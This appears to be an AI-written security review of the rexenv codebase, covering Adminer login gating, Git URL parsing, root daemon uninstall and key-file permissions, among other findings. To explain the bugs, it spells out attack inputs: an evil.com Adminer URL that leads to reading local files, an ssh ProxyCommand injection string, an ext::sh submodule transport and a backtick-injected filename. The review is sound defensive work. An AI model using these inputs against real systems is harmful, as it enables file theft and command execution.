# rexenv — Full Codebase Review

**Reviewer:** Claude (max-effort pass — read → verify-against-real-code → act)
**Date started:** 2026-07-18
**Baseline (clean):** `cargo test --lib` 320 passed / 0 failed · `cargo build --examples` ok · `tsc --noEmit` ok
**Canonical public URL:** `https://rexenv.rex.bd`

> ### ⚠️ Coverage status — this is a PARTIAL first pass
> A session usage limit (resets 20:50 Asia/Dhaka) killed most of the parallel reviewer
> agents mid-run. **Fully reviewed & verified so far:** the edge/DNS/TLS/Adminer core
> (`proxy`, `dns`, `ssl`, `adminer`, `tld`, `setup`, `firefox`), the macOS platform /
> privilege layer, the Git-repo + shell-exec feature (`repo`, `commands/repo`, `devtools`,
> `cli`, `terminal`), plus my own reads of the Adminer/repo/ssl/proxy/sites-parsing/uninstall
> paths. **NOT yet covered** (agents died before finishing): `binaries`/`downloads`,
> `service_manager`/`services`/`ports`/`monitor`/`stack_guard`, `sites`(full)/`site_env`(full)/
> `wordpress`/`wp_login`/`wp_tunnel`/`tunnels`/`wporg`/`blueprints`, `cli_server` + all
> `commands/*`, the DB engines (`db`/`database`/`mariadb`/`postgres`/`redis`/`php`/`apache`/
> `frankenphp`/`mail`), `state/*` + migrations, the **entire React/TS frontend**, the `cli/`
> crate, and build/packaging. See the Coverage log at the bottom. A second pass is needed.

## How to read this

- **(A) Fixed & committed** — clearly-safe, non-behavioral. Commit hash + why safe.
- **(B) Found but NOT fixed — needs your decision** — behavioral / security / lifecycle /
  uncertain. Each: what · why-maybe-bug · why-maybe-intentional · recommendation.
  **Per your rule, no security fix here has been applied — they await your go-ahead.**
- **(C) Cleanup done** — removals, with commit hash.
- **(D) Observations / questions** — smaller notes, confirmations of intentional design.

Each finding carries a **Verified:** tag — `me` = I read the exact code and confirmed it;
`agent` = surfaced by a reviewer agent with precise line refs that are consistent with the
architecture but I have **not** independently re-read those exact lines yet (called out so you
know the confidence level). Severity: 🔴 high · 🟠 medium · 🟡 low · ⚪ nit.

---

## (A) Fixed & committed

- **`a9d4dbf`** — **B1** Adminer passwordless-login gate: replaced the `strpos(SERVER,'127.0.0.1')
  === 0` *prefix* test with an **exact** loopback-host match (`127.0.0.1` / `::1` / `localhost`,
  after stripping an optional `:port` / MySQL `:socket` / bracketed IPv6). Landed ahead of the rest
  of the review at your direction: it was line-verified, independently exploitable
  (`127.0.0.1.evil.com` → passwordless login to a remote server → `LOAD DATA LOCAL INFILE`), and
  isolated from every other finding, with a Homebrew publish imminent. Proven through real PHP
  (system 8.2 + bundled 8.3/8.5) over a 21-case accept/reject matrix; guarded by a lib unit test +
  the runnable `examples/adminer_login_gate_check`. Full analysis retained under (B) B1.

---

## (B) Found but NOT fixed — needs your decision

### B1 · 🟠 security · Adminer passwordless-login gate is a *prefix* match, not loopback-only
**✅ FIXED — commit `a9d4dbf` (landed now at your direction; see (A)). Analysis kept for the record.**
**Where:** `src-tauri/src/core/adminer.rs:88-92` (the generated `WRAPPER_INDEX_PHP`).
**Verified:** me.
```php
function login($login, $password) {
    return strpos(\Adminer\SERVER, '127.0.0.1') === 0
        || strpos(\Adminer\SERVER, 'localhost') === 0;
}
```
**Why it might be a bug:** `\Adminer\SERVER` is **request-controlled** — it comes from Adminer's
login form (`auth[server]`) / `?server=`. `strpos(...) === 0` is a *starts-with* test, so
`127.0.0.1.evil.com` and `localhost.evil.com` both pass and get a **passwordless login against a
non-loopback host**. The doc for this very function says "loopback engines only … never a remote
host" — the prefix match breaks that invariant. Weaponization chain (local, but real): a page in
the user's browser navigates top-level to
`https://adminer.rexenv.rex/?server=127.0.0.1.evil.com&username=root&rexenv_auto` (the vhost
resolves to 127.0.0.1 for the user's browser too). The page loads *same-origin*, so Adminer
renders its form **with a valid CSRF token**, and the wrapper's `?rexenv_auto` auto-submit fires
it. Adminer then connects to the attacker's MySQL as `root`/empty; a malicious server replies with
`LOAD DATA LOCAL INFILE` to read files off the rexenv machine. `frame-ancestors` does **not** help
— it blocks framing, not top-level navigation.
**Why it might be intentional:** the loose match likely exists to allow a `:port` suffix
(`127.0.0.1:3306`). But that doesn't require a prefix match.
**Recommendation (fix is small & safe, but security → your call):** match the host **exactly**.
Split `SERVER` on `:` and accept only `127.0.0.1`, `localhost`, `::1` (optionally with a numeric
port); reject anything with a trailing label. This is my top-priority item — clear invariant
violation, trivial correct fix. I can implement + add a wrapper-content test on your word.

### B2 · 🟠 security/lifecycle · "Remove system changes" leaves the **root edge LaunchDaemon** installed and serving :443
**Where:** `commands/system.rs:362-370` (`uninstall_system`) · `core/setup.rs:50-59`
(`run_system_teardown`) · `EdgeSupervisor::uninstall_command()` at `platform/macos/mod.rs:995`.
**Verified:** me (three independent checks).
**Why it might be a bug:** `uninstall_system` calls `mgr.stop_all()` **directly**, not the
`stop_services` command — and `stop_services` is the only path that runs
`proxy::stop_edge_daemon` (the privileged `disable` + `bootout`). `stop_all` deliberately *skips*
a `Daemon` edge (ARCHITECTURE §3: it's "booted out by the stop COMMAND … OUTSIDE the lock").
`run_system_teardown` removes resolver files, untrusts the CA, uninstalls the DNS agent, and
removes the CLI symlink — but **never touches `platform.edge()`**. And `EdgeSupervisor::
uninstall_command()` — written for exactly this — has **zero production callers** (grep: only the
trait def, the two stubs, and a `#[cfg(test)]` mock). Net after "Remove system changes": the
`/Library/LaunchDaemons/dev.rexenv.rexenv.edge.plist`, the root-owned caddy copy and wrapper under
`/Library/Application Support/dev.rexenv.rexenv/` all remain, and because the plist is
`KeepAlive=true`, **launchd keeps a root Caddy bound to :443 indefinitely** — directly
contradicting the command's own promise ("leaving the machine as if rexenv's system setup never
ran"). This is a real problem for the Homebrew uninstall story you're about to ship.
**Why it might be intentional:** none I can construct — the command's docstring states the
opposite of the observed behavior. (Possible historical reason: teardown predates the daemon edge
and was never updated when the `Child`→`Daemon` edge landed.)
**Recommendation:** have `uninstall_system` boot out **and uninstall** the edge daemon — e.g. run
`proxy::stop_edge_daemon` (as `stop_services` does) and then invoke
`EdgeSupervisor::uninstall_command()` inside `run_system_teardown`, so the plist + root tree are
removed. Wants a careful diff (privileged step, prompt ordering) — I'll write it up as a scoped
change if you want it. **Related doc drift:** ARCHITECTURE §3 says an already-installed daemon
takes the lighter `start_command()` — but `start_command()` also has zero production callers
(`start_edge_daemon` always reinstalls). Worth reconciling doc ↔ code.

### B3 · 🟠 security · Git ssh/scp URL parsing doesn't reject a leading-dash authority → `ssh` option injection before any clone
**Where:** `core/repo.rs:147-171` (`parse_ssh_url`), `173-201` (`parse_scp_like`).
**Verified:** me.
**Why it might be a bug:** neither parser rejects a `user` or `host` component beginning with `-`,
and `parse_ssh_url` rebuilds the URL from the **entirely unvalidated** `userhost`
(`format!("ssh://{userhost}/{path}")`, line 166). `parse_scp_like` charset-checks the *host* but
never the *user*, and permits a leading `-` in the host. Whitespace is rejected upstream
(line 55), but `$IFS` sidesteps that. So a pasted
`-oProxyCommand=touch$IFS/tmp/pwned@host:repo` survives parsing and reaches `git ls-remote -- <url>`
at the probe step (**before any clone**); git hands `-oProxyCommand=…@host` to `ssh`, which treats
it as an option → arbitrary command execution as the user (CVE-2017-1000117 family). The `--` at
the git call protects git's *own* option parser, not the downstream `ssh`. The "repo scripts never
run implicitly" guard doesn't help — this is in the transport, not repo content. Trigger is
social-engineering ("clone my plugin: `<crafted url>`").
**Why it might be intentional:** the design leans on the system git's own CVE mitigation (modern
git blocks the common `user@host` leading-dash cases). But rexenv ships to arbitrary machines with
arbitrary git versions, and this module's stated contract is "URL+auth validated BEFORE any clone"
— that boundary shouldn't silently delegate an RCE-class check to an external binary's version.
**Recommendation:** in both parsers, after splitting, reject any authority whose host **or** user
`starts_with('-')`, and apply the scp host-charset rule to `parse_ssh_url` too. Cheap; makes the
stated guarantee real. Security → your call.

### B4 · 🟠 security · `git clone --recurse-submodules` on an untrusted repo executes attacker-controlled `.gitmodules`
**Where:** `core/repo.rs:595` (clone argv includes `--recurse-submodules`).
**Verified:** agent (flag presence consistent with ARCHITECTURE §9's "full-history clone" design;
I have not re-read the exact clone builder).
**Why it might be a bug:** submodule URLs/paths come from the cloned repo's `.gitmodules`, which
the user never sees at paste time. A legit-looking repo can carry a submodule whose URL is
`-oProxyCommand=…` or an `ext::sh -c …` transport; on clone, git recurses and executes it
(CVE-2018-17456 family). The "clone executes no repo code" invariant holds for hooks/detection but
**not** for submodule transport handling.
**Why it might be intentional:** ARCHITECTURE §9 deliberately chooses full-history
`--recurse-submodules` ("a working checkout the developer will commit and push from") — reasonable
for a *trusted* repo; the gap is that "paste any URL" invites untrusted ones.
**Recommendation:** keep the flag but harden the transport surface on the clone argv:
`-c protocol.ext.allow=never -c protocol.file.allow=user` (and rely on git's built-in leading-`-`
submodule guard). Optionally surface submodule presence in the read-only detection step so the
disclosure line can mention it. Security → your call.

### B5 · 🟠 bug · `caddy reload` / `caddy stop` wait on the child with no timeout
**Where:** `core/proxy.rs:362-378` (`reload`) and `381-390` (`stop_admin`), both via `wait_ok` →
`child.wait()`.
**Verified:** me.
**Why it might be a bug:** `admin_alive()` returns true whenever the admin socket *accepts* a
connection. A wedged edge (socket listening, request loop stuck — the exact orphan-worker class
the codebase already guards elsewhere) accepts the reload/stop connection and never answers, so
`caddy reload`/`stop` hangs and `child.wait()` blocks **forever**. That freezes the caller (e.g.
Stop-all via `stop_edge`→`stop_admin`); if the caller holds the services `Mutex`, every start/stop
behind it stalls (status polls survive on `try_lock`). Go's default admin HTTP client has no
request timeout, so nothing bounds this from rexenv's side.
**Why it might be intentional:** relies on the caddy CLI to time out itself — but it doesn't.
**Recommendation:** bound the wait (spawn + poll `try_wait` to a deadline, then `kill`), mirroring
the bounded `admin_alive` poll loops already in this file. Behavioral (lifecycle) → your call.

### B6 · 🟡 security · CA / site private keys are written world-readable, then hardened
**Where:** `core/ssl.rs:96-97` (`fs::write(key_path, …)`) → perms hardened later at `108-113`
(`perms.set_private`); site keys share the pattern.
**Verified:** me.
**Why it might be a bug:** `fs::write` creates the key under the process umask (typically `0644`
— group/other-readable) and only *afterward* does `set_private` chmod it to `0600`. On a
multi-user Mac with a traversable parent dir, a racing local user could read the **CA private key**
in that window — and the CA is trusted in the login keychain, so its key mints trusted leaves for
any domain (MITM). Narrow (race + multi-user + traversal), but the CA key is the crown jewel.
**Why it might be intentional:** `PermissionManager` is the platform seam for perms; write-then-
chmod is the simple path.
**Recommendation:** create the key file `0600` atomically (`OpenOptions::new().mode(0o600)`)
before writing — no readable window. Touches key material → your call.

### B7 · 🟡 leak/lifecycle · Repo probe runner has no process group; timeout orphans the ssh grandchild
**Where:** `core/repo.rs:347-395` (`run_captured_with_cap`).
**Verified:** me.
**Why it might be a bug:** unlike `spawn_streamed` (which sets `.process_group(0)`), this captured
runner spawns a plain child. On the 30s probe timeout it does `child.kill()` (the **leader only**)
+ `child.wait()`, then returns **without joining** the `out_t`/`err_t` reader threads. `git
ls-remote` over SSH spawns an `ssh` grandchild (over https, a `git-remote-https` helper); on
timeout that grandchild is orphaned to launchd until its own network timeout, and the reader
threads block on `read_to_end` while the orphan still holds the pipe write-end. This is precisely
the orphan-worker class the module's own doc says `spawn_streamed` exists to prevent — the
network-facing path just doesn't use it.
**Why it might be intentional:** the same runner also does fast local reads (`status`, `branch`)
that spawn no grandchildren, so a group felt unnecessary. Impact is bounded (grandchildren exit
when their pipe breaks).
**Recommendation:** spawn the probe child in its own process group and, on timeout, `stop_group`
(the primitive the streamed path uses) instead of `child.kill()`; join the reader threads after.
Behavioral (process lifecycle) → your call.

### B8 · 🟡 security (defense-in-depth) · Adminer proxy builds the upstream URL by string concat + accepts invalid certs
**Where:** `core/adminer.rs:239` (`Url::parse(format!("https://{ADMINER_HOST}{path_and_query}"))`)
with the client at `192-208` using `.danger_accept_invalid_certs(true)`.
**Verified:** me (code shape) — **not currently reachable** (see below).
**Why it might be a bug:** if `path_and_query` ever began with `@evil.com/` the URL would parse to
host `evil.com` (with `adminer.rexenv.rex` as userinfo); the client's `.resolve(ADMINER_HOST→
127.0.0.1)` wouldn't apply, and with cert-checking off that's an SSRF to an arbitrary host. Today
`path_and_query` comes from the app's own `rexdb://` scheme handler and normally starts with `/`,
so it's latent, not live.
**Why it might be intentional:** the value is treated as trusted (app-origin). Fair, but it's a
raw concat feeding a cert-check-disabled client.
**Recommendation (cheap hardening):** assert/normalize `path_and_query` starts with `/` (reject
otherwise), or set path/query via `Url` setters instead of concatenation. Low urgency.

### B9 · 🟡 security (defense-in-depth) · `repo_add` stores/passes `git_ref` without `validate_ref`
**Where:** `commands/repo.rs:226,258` (per agent) — the checkout path validates
(`commands/repo.rs:588` + `repo.rs:909`), the add path does not.
**Verified:** agent (I have not re-read `commands/repo.rs`).
**Why it might be a bug:** `git_ref` from IPC lands at `git clone … --branch <ref> -- <url>`.
Not demonstrably exploitable (the ref is consumed as `--branch`'s value and everything after `--`
is positional, so a `-`-leading ref can't become a flag), but it violates the module's own header
("anything reaching git argv is validated at parse time").
**Recommendation:** `git_ref.map(|r| repo::validate_ref(&r)).transpose()?` in `repo_add`, matching
the checkout path. Consistency + defense-in-depth.

### B10 · 🟡 security (defense-in-depth) · Filesystem-scanned TLD names reach a privileged `rm` unvalidated
**Where:** `core/dns.rs:289-325` (`installed_tlds`/`tlds_matching_signature` →
`remove_all_resolvers`) feeding `platform.dns().uninstall_command(&tlds)`; the macOS
`uninstall_command` (`platform/macos/mod.rs:83`) interpolates names **unquoted** into a root
`rm -f`.
**Verified:** agent + me (I confirmed `uninstall_command` is the sink and is called from
`dns.rs:322`).
**Why it might be a bug:** the sweep collects `/etc/resolver` filenames filtered only by file
*content* (our signature), never by TLD syntax. A file named e.g. `` foo`reboot` `` with our exact
signature would inject into the root shell. **Not** a privilege escalation (planting the file needs
root already; the dir is root-owned and `read_dir` never yields `..`), but the code comment at
`macos/mod.rs:87` *claims* these are "[a-z]+ validated" — and they aren't.
**Why it might be intentional:** only root can populate `/etc/resolver`, so inputs are assumed
trusted.
**Recommendation:** filter scanned names through the same `[a-z]{1,63}` rule (`tld::…`) before the
privileged uninstall, or single-quote them in `uninstall_command`. Makes the stated invariant real.

### B11 · 🟡 low · Copy-paste "free the port" commands embed attacker-influenceable names, including `sudo`
**Where:** `platform/macos/mod.rs:521-543` (`free_port_command`, `brew_formula`, `attribute_holder`).
**Verified:** agent.
**Why it might be a bug:** the suggested-fix text builds `osascript -e 'quit app "{app}"'` and
`brew services stop {f} || sudo brew services stop {f}` from path segments of the port holder's
executable; directory names can contain `'`, `"`, `;`, spaces. rexenv never *executes* these
(diagnostic text only), but the user is told to paste them — one with `sudo`. Precondition is a
same-user process squatting our port under a crafted path (already user-level code-exec), so the
delta is a user-assisted `sudo` hop.
**Recommendation:** allowlist `[A-Za-z0-9 ._+@-]` for app/formula names before embedding; keep the
`sudo kill {pid}` (u32) fallback. Low.

### B12 · 🟡 low · `sh_quote` single-quotes but doesn't escape an embedded `'` in root-context scripts
**Where:** `core/proxy.rs:219-221` and `platform/macos/mod.rs:806-808` (vs the gold-standard
refuse-pattern in `core/cli.rs:104-113`).
**Verified:** me (proxy.rs) + agent (macos/mod.rs).
**Why it might be a bug:** a path containing `'` breaks out of the single-quoted wrap into a
**root** shell context (`run_privileged`). All values are app-data/HOME-derived paths (never IPC
input) and macOS short usernames can't contain `'`, so it's latent — but CLAUDE.md's "quote all
paths" isn't actually satisfied for the `'` case, and this is root context.
**Recommendation:** adopt the `cli.rs` pattern (refuse paths containing a quote, or POSIX-escape
`'` → `'\''`). Consistency + belt-and-suspenders on a root path.

### B13 · ⚪ nit · Fixed CA expiry cliff (2024→2034) while leaves are now-anchored
**Where:** `core/ssl.rs:71-72` (`not_before/​not_after = date_time_ymd(2024/2034,1,1)`).
**Verified:** me.
A CA minted today still expires 2034-01-01, so leaves issued in late 2033 can outlive the CA, and
everything breaks at the 2034 cliff regardless of install date. **Recommendation:** now-anchor the
CA window (e.g. `now-1d … now+10y`) like the leaves.

### B14 · ⚪ nit · Prod Adminer CSP bakes in the Vite dev origin
**Where:** `core/adminer.rs:134-135` — `frame-ancestors … http://localhost:1420`.
**Verified:** me.
In a release build any local process on `:1420` could frame the passwordless Adminer vhost
(clickjacking, local-only). **Recommendation:** emit the dev origin only under
`#[cfg(debug_assertions)]`.

### B15 · ⚪ nit · `edge_answers_as_ours` falls back to `Server: caddy`
**Where:** `core/proxy.rs:74-79`.
**Verified:** agent.
A developer's own Caddy on loopback:443 emits `Server: Caddy` and could be mis-identified as
rexenv's edge — mildly at odds with the M1 "never mistake a foreign Caddy" invariant. Only bites
in the narrow pre-`X-Rexenv-Edge`-marker window. **Recommendation:** drop the fallback now that the
marker is universal, or gate it behind an extra rexenv signal.

### B16 · misc low/info (reported, batch for a second look)
All `agent`-sourced, lower priority; listed so nothing's lost:
- `core/repo.rs` `run_step_streamed` has **no idle timeout** — a network black-hole mid-clone hangs
  the job until the user cancels. Consider an idle-output watchdog.
- `core/devtools.rs:53-61` `probe_version` runs `<tool> --version` with **no timeout** — a hung
  binary blocks `repo_tools`/`repo_probe`.
- `core/terminal.rs:86,152-157` interpolates app paths into shell strings **without** the `cli.rs`
  quote-refusal (consistency; app-controlled paths, user's own PTY).
- `commands/repo.rs` `RepoJobs.jobs` map is **never pruned** (minor unbounded growth over a long
  session; `cancel_all_on_exit` over stale entries is harmless).
- `core/repo.rs:1200-1220` delete-guard **TOCTOU** on the *non-symlink* path (the symlink path
  re-checks via `remove_symlink`; the wp-cli path doesn't). Single-user threat model.
- `core/repo.rs:74` accepts plaintext `http://` (kept for self-hosted forges; negligible here).
- Edge wrapper root chown loop vs a **hardlink** to another root socket (`macos/mod.rs:906-927`) —
  theoretical; needs same-user attacker + a worth-stealing root socket.

### B17 · 🟡 low · CLI socket reads the request line unbounded, with no read timeout
**Where:** `cli_server.rs:88-104` (`serve`).
**Verified:** me.
Each connection is handled in its own `tokio::spawn` (good — a slow client can't block the accept
loop or others), but the body does `BufReader::new(read).read_line(&mut line)` with **no size cap
and no timeout**. A client that streams bytes without a newline grows `line` unboundedly (memory),
and one that connects and never sends leaks the spawned task forever; there's no per-connection
cap. The socket is `0600` (same-user), and a same-user process is outside the threat model — so
this is robustness/DoS-against-self, not a boundary crossing. Still a missing bound.
**Recommendation:** wrap the reader in `.take(MAX_REQUEST_BYTES)` and put a `tokio::time::timeout`
around the `read_line`. Cheap; low urgency.

---

## (C) Cleanup done

- **`e1de4a5`** — removed a compiler-flagged unused import
  (`use rexenv_lib::platform::traits::Platform;`) in
  `src-tauri/examples/resource_totals_check.rs`. Non-behavioral; example rebuilds clean.

---

## (D) Observations / questions

**Deliberate designs verified INTACT** (checked so a later pass doesn't re-flag them):
- Edge admin is unix-socket-only — **no TCP `:2019`** anywhere in the reviewed platform/proxy code.
  Daemon executes the `root:wheel 0755` *copy* of caddy, never the user cache; plist `0644`;
  `enable` precedes `bootstrap`. (`macos/mod.rs`, pinned by tests.)
- `prepare_binary` order **de-quarantine → relink → codesign LAST** holds; `prepare_binary_tree`
  signs last after all relinks.
- CA trust = argv-only `security`, **login keychain**, no `-d`/System keychain.
- **The TLD chain is airtight** for privileged commands: every TLD reaching a root shell is the
  constant `"rex"` or passes `validate_domain`→`tld::ensure_allowed` (strict `[a-z]{1,63}`), which
  kills both shell-injection and `/etc/resolver` path traversal. (The *sweep* path is the one gap —
  B10.)
- `core/cli.rs` privileged install script is the **gold standard**: single-quoted paths, refuses
  embedded quotes before running as root.
- Repo feature: `GIT_TERMINAL_PROMPT=0` forced; `ext://`/`file://`/`git://` transports rejected in
  `parse_source`; pure-fs detection (no repo code on clone); `--` before positional URL/dest;
  per-child **process groups** that die with the app (`RunEvent::Exit`); NUL-marker login-shell env
  parse is robust and repo-independent; `ahead=None` for no-upstream; link/delete guards on
  filesystem truth. (Residual gaps are B3/B4/B7/B16.)
- Adminer auto-submit uses `json_encode` + the CSP nonce (no XSS in the injected script) and is
  keyed per-target-server; the DNS handler refuses non-query opcodes and never panics on malformed
  input; liveness probes (`answers_as_ours`, `edge_answers_as_ours`) carry explicit timeouts.
- Platform trait drift: **none** — windows/linux implement all 11 traits with matching signatures;
  omitted optional methods fall to erroring/empty defaults (honest failures).
- **`site_env` trust boundary holds end-to-end** (verified by me): names are identifier-validated
  with a RESERVED list that's *coverage-tested* against the nginx template + `HTTP_` prefix block;
  values reject `$`/`{`/`}`/control chars and escape `\`/`"`; and all three emitters wrap the
  escaped value in **double quotes** — nginx `services.rs:375`, Apache `SetEnv … "…"` `apache.rs:130`,
  FrankenPHP `env … "…"` `frankenphp.rs:51`. Names are safe unquoted (identifier charset). Solid.
- **Binary archive extraction is zip-slip-safe** (verified by me): `safe_join` (`binaries.rs:1588`)
  rejects `..`/absolute/Windows-prefix components; `link_stays_within` (`1611`) lexically bounds
  symlink *and* hardlink targets to `dest` (absolute/root rejected, `..` allowed only if the result
  still `starts_with(dest)`), closing the write-through-a-planted-symlink path; `publish` (`1651`)
  stages then atomically renames with correct H4 un-poisoning of a crashed partial. No traversal.

**Canonical-URL check:** no reference to `https://rexenv.rex.bd` appears in any file reviewed so
far (the reviewed layer is all internal hosts — `adminer.rexenv.rex`, the `.rex` backbone). The
build/packaging + docs + frontend still need the URL-consistency sweep (that agent didn't finish).

**Questions for you:**
1. B2 uninstall behavior — is leaving the root daemon a known trade-off, or a real gap to close
   before Homebrew? (I read it as a gap.)
2. B1 Adminer gate — confirm you want the exact-match tightening; it's the one I'd prioritize.
3. Do you want me to resume the killed agents after the limit resets, or keep reading the
   uncovered areas myself?

---

## Coverage log

| Area | Files | Status |
|---|---|---|
| baseline | build / test / tsc | ✓ green (320 tests) |
| edge / DNS / TLS / adminer | `proxy` `dns` `ssl` `adminer` `tld` `setup` `firefox` | ✓ reviewed + key findings verified by me |
| macOS platform / privilege | `platform/macos/*` `traits.rs` `windows` `linux` | ✓ reviewed (agent) + uninstall verified by me |
| repo / shell-exec | `core/repo` `commands/repo` `devtools` `cli` `terminal` | ✓ reviewed (agent) + parse/probe verified by me |
| examples | `resource_totals_check` | ✓ cleanup committed |
| binaries / downloads | `binaries` `downloads` | ◐ extraction+publish guards verified by me (zip-slip-safe); `downloads` + rest of `binaries` NOT reviewed |
| service lifecycle | `service_manager` `services` `ports` `monitor` `stack_guard` `site_metrics` | ✗ agent died — NOT reviewed (only the env-emit line in `services` seen) |
| sites / WP / env / tunnels | `sites` `site_env` `wordpress` `wp_login` `wp_tunnel` `tunnels` `wporg` `blueprints` | ◐ `site_env` fully verified by me (robust); URL parsing in `sites`; rest NOT reviewed |
| CLI server + commands | `cli_server` + `commands/*` | ◐ `serve`/framing loop verified by me (B17); `dispatch` + `commands/*` NOT reviewed |
| DB engines + override servers | `db` `database` `mariadb` `postgres` `redis` `php` `apache` `frankenphp` `mail` | ◐ env-emit paths in `apache`/`frankenphp` verified by me; engines NOT reviewed |
| state / migrations | `state/*` | ✗ agent died — NOT reviewed |
| frontend (routes/ipc/types) | `lib/ipc` `types` `routes/*` `App` | ✗ agent died — NOT reviewed |
| frontend (components/lib) | `components/*` `lib/*` | ✗ agent died — NOT reviewed |
| CLI crate + build/packaging | `cli/*` `scripts` `build.rs` `tauri.conf.json` `capabilities` | ✗ agent died — NOT reviewed |
